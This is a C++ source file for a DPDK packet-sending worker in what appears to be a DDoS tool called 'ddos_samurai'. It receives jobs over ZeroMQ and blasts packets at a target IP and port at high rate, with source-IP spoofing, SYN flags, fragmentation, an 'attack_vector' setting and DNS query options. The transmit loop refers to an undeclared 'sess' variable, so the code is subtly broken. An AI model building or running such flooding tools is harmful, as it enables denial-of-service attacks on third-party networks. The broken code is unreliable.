#include <algorithm>
#include <chrono>
#include <cctype>
#include <cmath>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <exception>
#include <cstdlib>
#include <iostream>
#include <optional>
#include <string>
#include <vector>

#include <zmq.h>

#include "engine.hpp"
#include "pacing_engine.h"
#include "wire_protocol.h"
#include "zmq_worker_base.hpp"
#include "worker_common.hpp"

#ifdef SAMURAI_WITH_DPDK
extern "C" {
#include <rte_common.h>
#include <rte_eal.h>
#include <rte_ether.h>
#include <rte_errno.h>
#include <rte_ethdev.h>
#include <rte_mbuf.h>
#include <rte_mempool.h>
}
#endif

namespace {
using samurai::daemon::OptionalIntFromWire;
using samurai::daemon::SendFrame;
using samurai::daemon::BuildSnapshot;
using samurai::daemon::JsonError;
using samurai::daemon::PacingFromEnvelope;
using samurai::daemon::ReadFixed;
using samurai::daemon::SerializeSnapshot;

using ddos_samurai::cpu_native::PacketConfig;
using ddos_samurai::cpu_native::SpoofOptions;

constexpr const char* kDefaultJobs = "ipc:///tmp/samurai_jobs_dpdk";
constexpr const char* kDefaultEvents = "ipc:///tmp/samurai_events_dpdk";





std::vector<std::uint8_t> JsonPayloadFromStats(
    std::uint64_t correlation_id,
    const std::string& job_id,
    std::uint64_t packets_sent,
    std::uint64_t packets_errors,
    std::uint64_t bytes_sent,
    double actual_rps,
    double rate_accuracy_pct) {
  const std::string json =
      "{\"status\":\"ok\",\"worker_kind\":\"dpdk\",\"correlation_id\":" +
      std::to_string(correlation_id) +
      ",\"job_id\":\"" + job_id +
      "\",\"packets_sent\":" + std::to_string(packets_sent) +
      ",\"packets_errors\":" + std::to_string(packets_errors) +
      ",\"bytes_sent\":" + std::to_string(bytes_sent) +
      ",\"actual_rps\":" + std::to_string(actual_rps) +
      ",\"rate_accuracy_pct\":" + std::to_string(rate_accuracy_pct) +
      ",\"note\":\"dpdk_tx_burst\"}";
  return std::vector<std::uint8_t>(json.begin(), json.end());
}



PacketConfig ConfigFromEnvelope(const samurai::wire::JobEnvelopeV1& env) {
  PacketConfig cfg;
  cfg.target_ip = ReadFixed(env.target_ip, sizeof(env.target_ip));
  cfg.target_port = static_cast<int>(env.target_port);
  cfg.protocol = ReadFixed(env.protocol, sizeof(env.protocol));
  if (cfg.protocol.empty()) cfg.protocol = "tcp";
  cfg.spoof = env.spoof_enabled != 0u;
  cfg.spoof_opts = SpoofOptions{
      .mode = ReadFixed(env.spoof_mode, sizeof(env.spoof_mode)),
      .subnet = [&]() -> std::optional<std::string> {
        const std::string v = ReadFixed(env.spoof_subnet, sizeof(env.spoof_subnet));
        return v.empty() ? std::nullopt : std::optional<std::string>(v);
      }(),
      .list_file = [&]() -> std::optional<std::string> {
        const std::string v = ReadFixed(env.spoof_list_file, sizeof(env.spoof_list_file));
        return v.empty() ? std::nullopt : std::optional<std::string>(v);
      }(),
  };
  cfg.has_payload = env.has_payload != 0u;
  cfg.tcp_flags = ReadFixed(env.tcp_flags, sizeof(env.tcp_flags));
  if (cfg.tcp_flags.empty()) cfg.tcp_flags = "S";
  cfg.ttl = OptionalIntFromWire(env.ttl);
  cfg.tos = OptionalIntFromWire(env.tos);
  cfg.window = OptionalIntFromWire(env.window);
  cfg.fragment_enabled = env.fragment_enabled != 0u;
  cfg.fragment_size = static_cast<int>(env.fragment_size);
  cfg.pad_size = static_cast<int>(env.pad_size);
  cfg.attack_vector = ReadFixed(env.attack_vector, sizeof(env.attack_vector));
  if (cfg.attack_vector.empty()) cfg.attack_vector = "basic";
  cfg.dns_name = ReadFixed(env.dns_name, sizeof(env.dns_name));
  if (cfg.dns_name.empty()) cfg.dns_name = "example.com";
  cfg.dns_edns = env.dns_edns != 0u;
  cfg.dns_recursive = env.dns_recursive != 0u;
  const std::string qtypes_raw = ReadFixed(env.dns_qtype, sizeof(env.dns_qtype));
  if (!qtypes_raw.empty()) {
    cfg.dns_qtypes.clear();
    std::size_t start = 0;
    while (start < qtypes_raw.size()) {
      const std::size_t comma = qtypes_raw.find(',', start);
      const std::size_t end = (comma == std::string::npos) ? qtypes_raw.size() : comma;
      const std::string part = qtypes_raw.substr(start, end - start);
      if (!part.empty()) cfg.dns_qtypes.push_back(part);
      if (comma == std::string::npos) break;
      start = comma + 1;
    }
  }
  return cfg;
}


#ifdef SAMURAI_WITH_DPDK
struct DpdkSession {
  bool eal_ok{false};
  std::uint16_t port_id{0};
  std::uint16_t queue_id{0};
  rte_mempool* mempool{nullptr};
  bool port_started{false};
};

bool EnsureEalOnce(const std::string& eal_args, std::string& err) {
  static bool initialized = false;
  static std::string locked_args;
  if (initialized) {
    if (locked_args != eal_args) {
      err = "dpdk_eal_duplicate_init";
      return false;
    }
    return true;
  }

  std::vector<std::string> argv_store;
  argv_store.emplace_back("samurai_dpdk_worker");
  std::string token;
  for (char c : eal_args) {
    if (std::isspace(static_cast<unsigned char>(c))) {
      if (!token.empty()) {
        argv_store.push_back(token);
        token.clear();
      }
      continue;
    }
    token.push_back(c);
  }
  if (!token.empty()) argv_store.push_back(token);

  std::vector<char*> argv;
  argv.reserve(argv_store.size());
  for (auto& s : argv_store) argv.push_back(const_cast<char*>(s.c_str()));
  if (rte_eal_init(static_cast<int>(argv.size()), argv.data()) < 0) {
    err = std::string("dpdk_eal_init_failed:") + rte_strerror(rte_errno);
    return false;
  }
  initialized = true;
  locked_args = eal_args;
  return true;
}

bool InitPort(DpdkSession& sess, std::uint32_t mempool_size, std::string& err) {
  if (!rte_eth_dev_is_valid_port(sess.port_id)) {
    err = "dpdk_port_invalid";
    return false;
  }
  rte_eth_conf port_conf{};
  const std::uint16_t txq = static_cast<std::uint16_t>(sess.queue_id + 1);
  if (rte_eth_dev_configure(sess.port_id, 0, txq, &port_conf) < 0) {
    err = std::string("dpdk_dev_configure_failed:") + rte_strerror(rte_errno);
    return false;
  }

  int socket_id = rte_eth_dev_socket_id(sess.port_id);
  if (socket_id < 0) socket_id = 0;
  char mp_name[64];
  std::snprintf(mp_name, sizeof(mp_name), "samurai_dpdk_worker_mp_%u", static_cast<unsigned>(sess.port_id));
  sess.mempool = rte_pktmbuf_pool_create(
      mp_name,
      std::max<std::uint32_t>(mempool_size, 1024u),
      256,
      0,
      RTE_MBUF_DEFAULT_BUF_SIZE,
      socket_id);
  if (!sess.mempool) {
    err = std::string("dpdk_mempool_create_failed:") + rte_strerror(rte_errno);
    return false;
  }

  rte_eth_dev_info dev_info{};
  if (rte_eth_dev_info_get(sess.port_id, &dev_info) != 0) {
    err = "dpdk_dev_info_failed";
    return false;
  }
  rte_eth_txconf tx_conf = dev_info.default_txconf;
  for (std::uint16_t q = 0; q < txq; ++q) {
    if (rte_eth_tx_queue_setup(sess.port_id, q, 1024, socket_id, &tx_conf) < 0) {
      err = std::string("dpdk_tx_queue_setup_failed:") + rte_strerror(rte_errno);
      return false;
    }
  }
  if (rte_eth_dev_start(sess.port_id) < 0) {
    err = std::string("dpdk_dev_start_failed:") + rte_strerror(rte_errno);
    return false;
  }
  sess.port_started = true;
  return true;
}

void Teardown(DpdkSession& sess) {
  if (sess.port_started) {
    (void)rte_eth_dev_stop(sess.port_id);
    (void)rte_eth_dev_close(sess.port_id);
    sess.port_started = false;
  }
}

struct DpdkSessionGuard {
  DpdkSession session{};
  ~DpdkSessionGuard() { Teardown(session); }
};
#endif

}  // namespace

int main(int argc, char** argv) {
  std::string jobs_ep = kDefaultJobs;
  std::string events_ep = kDefaultEvents;
  bool bind_jobs = true;
  bool bind_events = false;
  int cli_port_id = -1;
  int cli_queue_id = -1;
  std::string cli_eal_args;

  for (int i = 1; i < argc; ++i) {
    std::string arg = argv[i];
    if (arg == "--job-endpoint" && i + 1 < argc) {
      jobs_ep = argv[++i];
    } else if (arg == "--event-endpoint" && i + 1 < argc) {
      events_ep = argv[++i];
    } else if (arg == "--jobs-mode" && i + 1 < argc) {
      bind_jobs = std::string(argv[++i]) == "bind";
    } else if (arg == "--events-mode" && i + 1 < argc) {
      bind_events = std::string(argv[++i]) == "bind";
    } else if (arg == "--dpdk-port-id" && i + 1 < argc) {
      cli_port_id = std::stoi(argv[++i]);
    } else if (arg == "--dpdk-queue-id" && i + 1 < argc) {
      cli_queue_id = std::stoi(argv[++i]);
    } else if (arg == "--dpdk-eal-args" && i + 1 < argc) {
      cli_eal_args = argv[++i];
    }
  }

  void* ctx = zmq_ctx_new();
  if (!ctx) {
    std::cerr << "zmq_ctx_new failed\n";
    return 1;
  }

  void* pull = zmq_socket(ctx, ZMQ_PULL);
  void* push = zmq_socket(ctx, ZMQ_PUSH);
  if (!pull || !push) {
    std::cerr << "zmq_socket failed\n";
    if (pull) zmq_close(pull);
    if (push) zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }

  if ((bind_jobs ? zmq_bind(pull, jobs_ep.c_str()) : zmq_connect(pull, jobs_ep.c_str())) != 0) {
    std::cerr << "jobs socket init failed: " << jobs_ep << "\n";
    zmq_close(pull);
    zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }
  if ((bind_events ? zmq_bind(push, events_ep.c_str()) : zmq_connect(push, events_ep.c_str())) != 0) {
    std::cerr << "events socket init failed: " << events_ep << "\n";
    zmq_close(pull);
    zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }

  bool running = true;
  while (running) {
    zmq_msg_t msg;
    zmq_msg_init(&msg);
    const int n = zmq_msg_recv(&msg, pull, 0);
    if (n <= 0) {
      zmq_msg_close(&msg);
      continue;
    }

    const std::size_t sz = static_cast<std::size_t>(zmq_msg_size(&msg));
    if (sz < sizeof(samurai::wire::SamuraiWireHeaderV1)) {
      zmq_msg_close(&msg);
      continue;
    }

    const auto* raw = static_cast<const std::uint8_t*>(zmq_msg_data(&msg));
    samurai::wire::SamuraiWireHeaderV1 header{};
    std::memcpy(&header, raw, sizeof(header));
    const std::size_t payload_len = sz - sizeof(header);
    const std::uint8_t* payload_ptr = raw + sizeof(header);

    if (!samurai::wire::IsHeaderV1Compatible(header)) {
      zmq_msg_close(&msg);
      continue;
    }

    const auto msg_type = static_cast<samurai::wire::MessageType>(header.msg_type);
    const std::string job_id = samurai::daemon::ReadJobId(header);

    if (msg_type == samurai::wire::MessageType::SHUTDOWN) {
      (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ACK), header.correlation_id,
                      samurai::wire::WorkerKind::DPDK, job_id);
      running = false;
      zmq_msg_close(&msg);
      continue;
    }

    if (msg_type == samurai::wire::MessageType::START_JOB) {
      if (payload_len != sizeof(samurai::wire::JobEnvelopeV1) || header.payload_len != sizeof(samurai::wire::JobEnvelopeV1)) {
        (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                        samurai::wire::WorkerKind::DPDK, job_id, JsonError("job_envelope_size_mismatch"));
        zmq_msg_close(&msg);
        continue;
      }
      samurai::wire::JobEnvelopeV1 env{};
      std::memcpy(&env, payload_ptr, sizeof(env));
      (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ACK), header.correlation_id,
                      samurai::wire::WorkerKind::DPDK, job_id);
      zmq_msg_close(&msg);

#ifndef SAMURAI_WITH_DPDK
      (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                      samurai::wire::WorkerKind::DPDK, job_id, JsonError("dpdk_not_built"));
      continue;
#else
      try {
        PacketConfig cfg = ConfigFromEnvelope(env);
        const int packet_count = std::max(1, static_cast<int>(env.packet_count));
        const auto pool = ddos_samurai::cpu_native::generate_packet_pool_view(cfg, packet_count, true, true);
        const std::size_t stride = pool.packet_size;
        if (stride == 0 || pool.size() < stride) {
          (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                          samurai::wire::WorkerKind::DPDK, job_id, JsonError("packet_pool_empty"));
          continue;
        }

        DpdkSessionGuard dpdk{};
        dpdk.session.port_id = static_cast<std::uint16_t>(std::max(0, cli_port_id >= 0 ? cli_port_id : static_cast<int>(std::getenv("SAMURAI_DPDK_PORT_ID") ? std::atoi(std::getenv("SAMURAI_DPDK_PORT_ID")) : 0)));
        dpdk.session.queue_id = static_cast<std::uint16_t>(std::max(0, cli_queue_id >= 0 ? cli_queue_id : static_cast<int>(env.xdp_queue_id)));
        std::string eal_args = cli_eal_args;
        if (eal_args.empty()) {
          const char* p = std::getenv("SAMURAI_DPDK_EAL_ARGS");
          if (p) eal_args = p;
        }

        std::string err;
        if (!EnsureEalOnce(eal_args, err)) {
          (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                          samurai::wire::WorkerKind::DPDK, job_id, JsonError(err));
          continue;
        }
        if (!InitPort(dpdk.session, 8192u, err)) {
          (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                          samurai::wire::WorkerKind::DPDK, job_id, JsonError(err));
          continue;
        }

        samurai_pacing_config_t pace_cfg = PacingFromEnvelope(env);
        samurai_pacing_state_t pace_state{};
        samurai_pacing_init(&pace_state, &pace_cfg);

        const std::uint64_t start_ns = samurai_pacing_monotonic_now_ns();
        std::uint64_t last_hb_ns = start_ns;
        std::uint64_t last_metric_ns = start_ns;
        std::uint64_t packets_sent = 0;
        std::uint64_t packets_errors = 0;
        std::uint64_t bytes_sent = 0;

        for (int i = 0; i < packet_count; ++i) {
          samurai_pacing_wait_next(&pace_state, &pace_cfg);
          const std::size_t off = static_cast<std::size_t>(i) * stride;
          if (off + stride > pool.size()) {
            packets_errors += 1u;
            continue;
          }

          rte_mbuf* mbuf = rte_pktmbuf_alloc(sess.mempool);
          if (!mbuf) {
            packets_errors += 1u;
            continue;
          }
          void* dst = rte_pktmbuf_append(mbuf, static_cast<std::uint16_t>(stride));
          if (!dst) {
            rte_pktmbuf_free(mbuf);
            packets_errors += 1u;
            continue;
          }
          std::memcpy(dst, pool.data() + off, stride);
          rte_mbuf* burst[1] = {mbuf};
          const std::uint16_t tx = rte_eth_tx_burst(dpdk.session.port_id, dpdk.session.queue_id, burst, 1);
          if (tx == 1) {
            packets_sent += 1u;
            bytes_sent += static_cast<std::uint64_t>(stride);
          } else {
            rte_pktmbuf_free(mbuf);
            packets_errors += 1u;
          }

          if ((static_cast<std::uint32_t>(i) & 0x3FFu) == 0u) {
            const std::uint64_t now_ns = samurai_pacing_monotonic_now_ns();
            if (now_ns - last_hb_ns >= 1'000'000'000ull) {
              (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::HEARTBEAT),
                              header.correlation_id, samurai::wire::WorkerKind::DPDK, job_id);
              last_hb_ns = now_ns;
            }
            if (now_ns - last_metric_ns >= 2'000'000'000ull) {
              const samurai::wire::MetricSnapshotV1 snap = BuildSnapshot(
                  now_ns, start_ns, packets_sent, packets_errors, bytes_sent, pace_cfg, pace_state);
              (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::METRIC_SNAPSHOT),
                              header.correlation_id, samurai::wire::WorkerKind::DPDK, job_id,
                              SerializeSnapshot(snap));
              last_metric_ns = now_ns;
              last_hb_ns = now_ns;
            }
          }
        }

        const std::uint64_t end_ns = samurai_pacing_monotonic_now_ns();
        const samurai::wire::MetricSnapshotV1 snap = BuildSnapshot(
            end_ns, start_ns, packets_sent, packets_errors, bytes_sent, pace_cfg, pace_state);
        (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::METRIC_SNAPSHOT),
                        header.correlation_id, samurai::wire::WorkerKind::DPDK, job_id,
                        SerializeSnapshot(snap));

        const std::vector<std::uint8_t> done = JsonPayloadFromStats(
            header.correlation_id, job_id, packets_sent, packets_errors, bytes_sent,
            snap.actual_rps, snap.rate_accuracy_pct);
        (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::JOB_DONE),
                        header.correlation_id, samurai::wire::WorkerKind::DPDK, job_id, done);
      } catch (const std::exception& exc) {
        (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                        samurai::wire::WorkerKind::DPDK, job_id, JsonError(exc.what()));
      }
      continue;
#endif
    }

    if (msg_type == samurai::wire::MessageType::STOP_JOB) {
      zmq_msg_close(&msg);
      (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ACK), header.correlation_id,
                      samurai::wire::WorkerKind::DPDK, job_id);
      const std::string stopped = "{\"status\":\"stopped\",\"worker_kind\":\"dpdk\"}";
      (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::JOB_DONE), header.correlation_id,
                      samurai::wire::WorkerKind::DPDK, job_id,
                      std::vector<std::uint8_t>(stopped.begin(), stopped.end()));
      continue;
    }

    zmq_msg_close(&msg);
    (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                    samurai::wire::WorkerKind::DPDK, job_id, JsonError("unsupported_msg_type"));
  }

  zmq_close(pull);
  zmq_close(push);
  zmq_ctx_term(ctx);
  return 0;
}
